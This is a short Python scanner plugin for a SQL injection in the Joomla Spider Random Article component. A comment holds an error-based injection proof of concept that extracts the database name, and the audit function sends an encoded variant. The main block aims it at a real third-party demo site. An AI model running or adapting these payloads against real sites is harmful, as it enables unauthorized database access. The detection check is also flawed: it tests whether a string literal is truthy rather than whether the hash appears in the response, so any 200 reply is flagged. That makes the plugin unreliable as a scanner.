#__author__ = 'ning-pc'
#title Joomla Spider Random Article SQL Injection
# PoC  /index.php?option=com_rand&catID=1' and(select 1 FROM(select count(*),concat((select (select concat(database(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -&limit=1&style=1&view=articles&format=raw&Itemid=13

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = 'index.php?option=com_rand&catID=1%27%20and(select%201%20FROM(select%20count(*),concat((select%20(select%20concat(md5(1),0x27,0x7e))%20FROM%20information_schema.tables%20LIMIT%200,1),floor(rand(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13'
    verify_url = arg+payload
    code, head, res, errcode, _ = curl.curl2(verify_url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b':
        security_hole(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://demo.web-dorado.com/')[1])